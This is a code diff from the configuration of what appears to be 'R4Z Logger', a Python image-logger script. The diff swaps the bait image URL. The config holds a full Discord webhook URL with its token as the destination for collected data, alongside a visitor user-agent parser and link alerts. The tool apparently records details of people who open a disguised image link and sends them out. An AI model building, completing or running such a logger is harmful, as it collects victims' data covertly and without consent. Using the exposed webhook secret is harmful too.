@@ -5,7 +5,7 @@ import traceback, requests, base64, httpagentparser
 # --- CONFIGURATION ---
 config = {
     "webhook": "https://discord.com/api/webhooks/1418902069984759868/QeEnBq9MY1Krb1eWER3P7NPDwhJK8QoqZVjHJVkWWxiJhsgNkO-Hv3FbOQ9JlCrKU8nH",
-    "image": "https://files.catbox.moe/yp5a33.jpg",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSh0Evg2YNAbxH1OyJeEgTWmYLoukpkNbhXjw&s",
     "username": "R4Z Logger",
     "color": 0x00FFFF,
     "linkAlerts": True,
